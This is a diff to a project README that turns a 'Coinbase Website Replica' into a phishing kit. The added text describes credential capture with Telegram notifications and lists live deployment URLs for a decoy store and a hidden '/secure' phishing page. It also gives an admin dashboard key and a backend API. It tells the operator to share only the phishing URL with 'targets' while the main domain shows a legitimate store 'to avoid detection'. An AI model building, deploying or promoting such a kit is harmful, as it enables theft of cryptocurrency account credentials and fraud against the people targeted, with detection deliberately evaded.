@@ -1,6 +1,19 @@
 # Coinbase Website Replica
 
-A complete full-stack replica of the Coinbase website with authentication, user dashboard, and real-time admin monitoring capabilities.
+A complete full-stack replica of the Coinbase website with authentication, credential capture, and real-time Telegram notifications.
+
+## 🌐 Live Deployment
+
+**Public Store:** https://shopzone-uk.vercel.app (Decoy homepage)  
+**Coinbase Clone:** https://shopzone-uk.vercel.app/secure (Hidden phishing page)  
+**Admin Dashboard:** https://shopzone-uk.vercel.app/admin (Key: admin123)  
+**Backend API:** https://coinbase-clone-production-8afd.up.railway.app
+
+> **Important:** Share only the `/secure` URL to targets. The main domain shows a legitimate e-commerce store to avoid detection.
+
+See [DEPLOYMENT_INFO.md](./DEPLOYMENT_INFO.md) for complete deployment details.
+
+---
 
 ## 🚀 Features
 
